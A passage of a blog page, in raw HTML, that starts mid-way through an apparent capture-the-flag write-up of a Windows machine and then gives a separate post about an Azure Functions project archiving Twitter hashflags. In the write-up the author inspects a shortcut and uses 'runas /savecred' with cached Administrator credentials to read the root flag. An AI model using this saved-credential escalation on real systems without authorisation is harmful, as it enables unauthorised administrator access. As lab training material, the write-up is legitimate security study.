</span></span></code></pre></div><p>Maybe one of the other users has something interesting we can use?</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-posh data-lang=posh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>C:\Users&gt;<span style=color:#0086b3>cd </span>engineer
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>Access is denied.
</span></span></code></pre></div><p>I didn&rsquo;t really expect that to work anyway</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-posh data-lang=posh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>C:\Users&gt;<span style=color:#0086b3>cd </span>Public
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>C:\Users\Public&gt;<span style=color:#0086b3>dir
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#0086b3></span> Volume <span style=color:#000;font-weight:700>in</span> drive C has no label.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span> Volume Serial Number is 9C45-DBF0
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span> Directory of C:\Users\Public
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#099>02</span>/<span style=color:#099>02</span>/<span style=color:#099>2019</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>14</span> PM    &lt;DIR&gt;          .
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#099>02</span>/<span style=color:#099>02</span>/<span style=color:#099>2019</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>14</span> PM    &lt;DIR&gt;          ..
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>05</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>06</span> AM    &lt;DIR&gt;          Documents
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>57</span> AM    &lt;DIR&gt;          Downloads
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>57</span> AM    &lt;DIR&gt;          Music
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>57</span> AM    &lt;DIR&gt;          Pictures
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>57</span> AM    &lt;DIR&gt;          Videos
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>               <span style=color:#099>1</span> File(s)        <span style=color:#099>964</span>,<span style=color:#099>179</span> bytes
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>               <span style=color:#099>7</span> Dir(s)  <span style=color:#099>16</span>,<span style=color:#099>723</span>,<span style=color:#099>468</span>,<span style=color:#099>288</span> bytes free
</span></span></code></pre></div><p>Wait a minute, we&rsquo;re missing some of the standard Windows directories. Let&rsquo;s have a closer look.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-posh data-lang=posh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>C:\Users\Public&gt;<span style=color:#0086b3>dir </span>/A
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span> Volume <span style=color:#000;font-weight:700>in</span> drive C has no label.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span> Volume Serial Number is 9C45-DBF0
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span> Directory of C:\Users\Public
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#099>02</span>/<span style=color:#099>02</span>/<span style=color:#099>2019</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>14</span> PM    &lt;DIR&gt;          .
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#099>02</span>/<span style=color:#099>02</span>/<span style=color:#099>2019</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>14</span> PM    &lt;DIR&gt;          ..
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#099>08</span>/<span style=color:#099>28</span>/<span style=color:#099>2018</span>  <span style=color:#099>06</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>51</span> AM    &lt;DIR&gt;          Desktop
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>57</span> AM               <span style=color:#099>174</span> desktop.ini
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>05</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>06</span> AM    &lt;DIR&gt;          Documents
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>57</span> AM    &lt;DIR&gt;          Downloads
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>02</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>34</span> AM    &lt;DIR&gt;          Favorites
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>57</span> AM    &lt;DIR&gt;          Libraries
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>57</span> AM    &lt;DIR&gt;          Music
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>57</span> AM    &lt;DIR&gt;          Pictures
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>57</span> AM    &lt;DIR&gt;          Videos
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>               <span style=color:#099>2</span> File(s)        <span style=color:#099>964</span>,<span style=color:#099>353</span> bytes
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>              <span style=color:#099>10</span> Dir(s)  <span style=color:#099>16</span>,<span style=color:#099>717</span>,<span style=color:#099>438</span>,<span style=color:#099>976</span> bytes free
</span></span></code></pre></div><p>Desktop has a much more recent modification date than everything else</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-posh data-lang=posh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>C:\Users\Public&gt;<span style=color:#0086b3>cd </span>Desktop
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>C:\Users\Public\Desktop&gt;<span style=color:#0086b3>dir
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#0086b3></span> Volume <span style=color:#000;font-weight:700>in</span> drive C has no label.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span> Volume Serial Number is 9C45-DBF0
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span> Directory of C:\Users\Public\Desktop
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#099>08</span>/<span style=color:#099>22</span>/<span style=color:#099>2018</span>  <span style=color:#099>09</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>18</span> PM             <span style=color:#099>1</span>,<span style=color:#099>870</span> ZKAccess3.5 Security System.lnk
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>               <span style=color:#099>1</span> File(s)          <span style=color:#099>1</span>,<span style=color:#099>870</span> bytes
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>               <span style=color:#099>0</span> Dir(s)  <span style=color:#099>16</span>,<span style=color:#099>711</span>,<span style=color:#099>475</span>,<span style=color:#099>200</span> bytes free
</span></span></code></pre></div><p>That&rsquo;s because there&rsquo;s a shortcut there.</p><p>Now, I&rsquo;m not sure of the best way to view a <code>.lnk</code> on <code>cmd.exe</code> via <code>telnet</code>, but this is what I came up with. If anyone knows of a better way, please let me know!</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-posh data-lang=posh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>C:\Users\Public\Desktop&gt;<span style=color:#0086b3>type </span><span style=color:#d14>&#34;ZKAccess3.5 Security System.lnk&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>L<span style=color:#a61717;background-color:#e3d2d2>�</span>F<span style=color:#a61717;background-color:#e3d2d2>�</span>@ <span style=color:#a61717;background-color:#e3d2d2>��</span><span style=color:#099>7</span><span style=color:#a61717;background-color:#e3d2d2>���</span><span style=color:#099>7</span><span style=color:#a61717;background-color:#e3d2d2>���</span><span style=color:#998;font-style:italic>#�P/P�O� �:i�+00�/C:\R1M�:Windows��:��M�:*wWindowsV1MV�System32��:��MV�*�System32X2P�:�</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>                                                                                                        runas.exe<span style=color:#a61717;background-color:#e3d2d2>��:</span><span style=color:#099>1</span><span style=color:#a61717;background-color:#e3d2d2>��:</span><span style=color:#099>1</span><span style=color:#a61717;background-color:#e3d2d2>�</span>*Yrunas.<span style=color:#0086b3>exeL-K</span><span style=color:#a61717;background-color:#e3d2d2>��</span>E<span style=color:#a61717;background-color:#e3d2d2>�</span>C:\Windows\System32\runas.exe<span style=color:#998;font-style:italic>#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred &#34;C:\ZKTeco\ZKAccess3.5\Access.exe&#34;&#39;C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%�</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>                      <span style=color:#a61717;background-color:#e3d2d2>�</span>wN<span style=color:#a61717;background-color:#e3d2d2>���</span>]N<span style=color:#a61717;background-color:#e3d2d2>�</span>D.<span style=color:#a61717;background-color:#e3d2d2>��</span>Q<span style=color:#a61717;background-color:#e3d2d2>���</span>`<span style=color:#a61717;background-color:#e3d2d2>�</span>Xaccess<span style=color:#a61717;background-color:#e3d2d2>�</span>_<span style=color:#a61717;background-color:#e3d2d2>���</span><span style=color:#099>8</span>{E<span style=color:#a61717;background-color:#e3d2d2>�</span><span style=color:#099>3</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span>                                                          O<span style=color:#a61717;background-color:#e3d2d2>�</span>j)<span style=color:#a61717;background-color:#e3d2d2>�</span>H<span style=color:#a61717;background-color:#e3d2d2>���</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span>                                                                   )ΰ[<span style=color:#a61717;background-color:#e3d2d2>�</span>_<span style=color:#a61717;background-color:#e3d2d2>���</span><span style=color:#099>8</span>{E<span style=color:#a61717;background-color:#e3d2d2>�</span><span style=color:#099>3</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span><span>                                                                                O<span style=color:#a61717;background-color:#e3d2d2>�</span>j)<span style=color:#a61717;background-color:#e3d2d2>�</span>H<span style=color:#a61717;background-color:#e3d2d2>���</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8</span><span>                                                                                         )ΰ[<span style=color:#a61717;background-color:#e3d2d2>�</span>	<span style=color:#a61717;background-color:#e3d2d2>��</span>1SPS<span style=color:#a61717;background-color:#e3d2d2>�</span>XF<span style=color:#a61717;background-color:#e3d2d2>�</span>L8C<span style=color:#a61717;background-color:#e3d2d2>���</span>&amp;<span style=color:#a61717;background-color:#e3d2d2>�</span>m<span style=color:#a61717;background-color:#e3d2d2>�</span>e*S-<span style=color:#099>1</span>-<span style=color:#099>5</span>-<span style=color:#099>21</span>-<span style=color:#099>953262931</span>-<span style=color:#099>566350628</span>-<span style=color:#099>63446256</span>-<span style=color:#099>500</span>
</span></span></code></pre></div><p>It&rsquo;s a bit difficult to read, but it looks like the shortcut runs a program as the <code>Administrator</code> using saved credentials. We can use that.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-posh data-lang=posh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>C:\Users\Public\Desktop&gt;runas /user<span style=color:#a61717;background-color:#e3d2d2>:</span>Administrator /savecred <span style=color:#d14>&#34;cmd.exe /c more C:\Users\Administrator\Desktop\root.txt &gt; C:\Users\Public\Desktop\output.txt&#34;</span>
</span></span></code></pre></div><p>Did it work?</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-posh data-lang=posh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>C:\Users\Public\Desktop&gt;more output.txt
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>&lt;SNIP&gt;
</span></span></code></pre></div><p>Yes! From there we could generate a reverse shell using <code>msfvenom</code> and run that as <code>Administrator</code>, but I&rsquo;ve got the flag so I&rsquo;ll leave it there for now.</p></div><div class=post><h1 class=post-title><a href=/blog/twitter-hashflags/>Twitter Hashflags (<em>Hash-what?</em>)</a></h1><span class=post-date>Mar 28, 2018 &#183; 4 minute read &#183; <a href=/blog/twitter-hashflags/#disqus_thread>Comments</a></span><p>Have you ever tweeted out a hastag, and discovered a small image attached to the side of it? It could be for <a href=https://twitter.com/HashflagArchive/status/972005822388514818>#StPatricksDay</a>, <a href=https://twitter.com/HashflagArchive/status/972170656912723969>#MarchForOurLives</a>, or whatever <a href=https://twitter.com/HashflagArchive/status/960529700442566656>#白白白白白白白白白白</a> is meant to be. These are hashflags.</p><p>A hashflag, sometimes called Twitter emoji, is a small image that appears after a #hashtag for special events. They are not regular emoji, and you can only use them on the Twitter website, or the official Twitter apps.</p><p>If you&rsquo;re a company, and <a href=http://www.adweek.com/digital/twitters-branded-emojis-come-million-dollar-commitment-169327/>you have enough money</a>, you can buy your own hashflag as well! That&rsquo;s exactly what Disney did for the release of Star Wars: The Last Jedi.</p><blockquote class=twitter-tweet><p lang=en dir=ltr>New hashtag emojis released by <a href="https://twitter.com/twitter?ref_src=twsrc%5Etfw">@Twitter</a> and <a href="https://twitter.com/starwars?ref_src=twsrc%5Etfw">@StarWars</a> ahead of <a href="https://twitter.com/hashtag/TheLastJedi?src=hash&amp;ref_src=twsrc%5Etfw">#TheLastJedi</a>! <a href="https://twitter.com/hashtag/BB8?src=hash&amp;ref_src=twsrc%5Etfw">#BB8</a> <a href="https://twitter.com/hashtag/BB9E?src=hash&amp;ref_src=twsrc%5Etfw">#BB9E</a> <a href="https://twitter.com/hashtag/Porg?src=hash&amp;ref_src=twsrc%5Etfw">#Porg</a> <a href=https://t.co/nnRJf43o0V>pic.twitter.com/nnRJf43o0V</a></p>&mdash; Good Morning America (@GMA) <a href="https://twitter.com/GMA/status/935573161051152385?ref_src=twsrc%5Etfw">November 28, 2017</a></blockquote><script async src=https://platform.twitter.com/widgets.js></script><p>If you spend the money to buy a hashflag, it&rsquo;s important that you launch it correctly—otherwise they can flop. <a href=https://twitter.com/HashflagArchive/status/960529700442566656>#白白白白白白白白白白</a> is an example of what not to do. At time of writing, it has only 10 uses.</p><p>Hashflags aren&rsquo;t exclusive to English, and they can help add context to a tweet in another language. I don&rsquo;t speak any Russian, but I do know that this image is of BB-8!</p><blockquote class=twitter-tweet><p lang=qme dir=ltr><a href="https://twitter.com/hashtag/%D0%B7%D0%B2%D1%91%D0%B7%D0%B4%D0%BD%D1%8B%D0%B5%D0%B2%D0%BE%D0%B9%D0%BD%D1%8B%D1%8D%D0%BF%D0%B8%D0%B7%D0%BE%D0%B48?src=hash&amp;ref_src=twsrc%5Etfw">#звёздныевойныэпизод8</a> <a href=https://t.co/qZsjHFR4jk>pic.twitter.com/qZsjHFR4jk</a></p>&mdash; Hashflags (@HashflagArchive) <a href="https://twitter.com/HashflagArchive/status/956184319206273024?ref_src=twsrc%5Etfw">January 24, 2018</a></blockquote><script async src=https://platform.twitter.com/widgets.js></script><p>Unfortunately hashflags are temporary, so any context they add to a tweet can sometimes be lost at a later date. Currently Twitter doesn&rsquo;t provide an official API for hashflags, and there is no canonical list of currently active hashflags. <a href=https://twitter.com/hashflaglist>@hashflaglist</a> tracks hashflags, but it&rsquo;s easy to miss one—this is where Azure Functions come in.</p><p>It turns out that on <a href=https://twitter.com>Twitter.com</a> the list of currently active hashflags is sent as a JSON object in the HTML as initial data. All I need to do is fetch Twitter.com, and extract the JSON object from the HTML.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>$ curl https://twitter.com -v --silent 2&gt;&amp;<span style=color:#099>1</span> | grep -o -P <span style=color:#d14>&#39;.{6}activeHashflags.{6}&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>&amp;quot;activeHashflags&amp;quot;
</span></span></code></pre></div><p>I wrote <a href=https://github.com/JamieMagee/hashflags-function/blob/master/hashflags/ActiveHashflags.cs>some C#</a> to parse and extract the <code>activeHashflags</code> JSON object, and store it in an Azure blob. You can find it <a href=https://hashflags.blob.core.windows.net/json/activeHashflags>here</a>. Using Azure Functions I can run this code on a timer, so the Azure blob is always up to date with the latest Twitter hashflags. This means the blob can be used as an unofficial Twitter hashflags API—but I didn&rsquo;t want to stop there.</p><p>I wanted to solve some of the issues with hashflags around both discovery and durability. Azure Functions is the perfect platform for these small, single purpose pieces of code. I ended up writing five Azure Functions in total—all of which can be found <a href=https://github.com/JamieMagee/hashflags-function>on GitHub</a>.</p><p><a href=https://github.com/JamieMagee/hashflags-function><img src=/img/hashflags-function-github.png alt="Screenshot of hashflags-function GitHub page"></a></p><ol><li><code>ActiveHashflags</code> fetches the active hashflags from Twitter, and stores them in a JSON object in an Azure Storage Blob. You can find the list of current hashflags <a href=https://hashflags.blob.core.windows.net/json/activeHashflags>here</a>.</li><li><code>UpdateHashflagState</code> reads the JSON, and updates the hashflag table with the current state of each hashflag.</li><li><code>StoreHashflagImage</code> downloads the hashflag image, and stores it in a blob store.</li><li><code>CreateHeroImage</code> creates a hero image of the hashtag and hashflag.</li><li><code>TweetHashflag</code> tweets the hashtag and hero image.</li></ol><p>Say hello to <a href=https://twitter.com/HashflagArchive>@HashflagArchive</a>!</p><p><a href=https://twitter.com/HashflagArchive><img src=/img/hashflag-archive.png alt="Screenshot of HashflagArchive Twitter stream"></a></p><p>@HashflagArchive solves both the issues I have with hashflags: it tweets out new hashflags the same hour they are activated on twitter, which solves the issue of discovery; and it tweets an image of the hashtag and hashflag, which solves the issue of hashflags being temporary.</p><p>So this is great, but there&rsquo;s still one issue—how to use hashflags outside of Twitter.com and the official Twitter apps. This is where the JSON blob comes in. I can build a wrapper library around that, and then using that library, build applications with Twitter hashflags. So that&rsquo;s exactly what I did.</p><p><a href=https://github.com/JamieMagee/hashflags-node><img src=/img/hashflags-node-github.png alt="Screenshot of hashflags-node GitHub page"></a></p><p>I wrote an npm package called <a href=https://www.npmjs.com/package/hashflags><code>hashflags</code></a>. It&rsquo;s pretty simple to use, and integrates nicely with the official <a href=https://www.npmjs.com/package/twitter-text><code>twitter-text</code></a> npm package.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-ts data-lang=ts><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#000;font-weight:700>import</span> { Hashflags } <span style=color:#000;font-weight:700>from</span> <span style=color:#d14>&#39;hashflags&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span><span style=color:#000;font-weight:700>let</span> hf: <span style=color:#458;font-weight:700>Hashflags</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>Hashflags.FETCH().then((val: <span style=color:#458;font-weight:700>Map</span>&lt;<span style=color:navy>string</span><span style=color:#a61717;background-color:#e3d2d2>,</span> <span style=color:teal>string</span>&gt;) <span style=color:#000;font-weight:700>=&gt;</span> {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span>  hf <span style=color:#000;font-weight:700>=</span> <span style=color:#000;font-weight:700>new</span> Hashflags(val);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span>  console.log(hf.activeHashflags);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span><span>});
</span></span></code></pre></div><p>I wrote it in TypeScript, but it can also be used from plain old JS as well.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-js data-lang=js><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#000;font-weight:700>const</span> Hashflags <span style=color:#000;font-weight:700>=</span> require(<span style=color:#d14>&#39;hashflags&#39;</span>).Hashflags;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span><span style=color:#000;font-weight:700>let</span> hf;
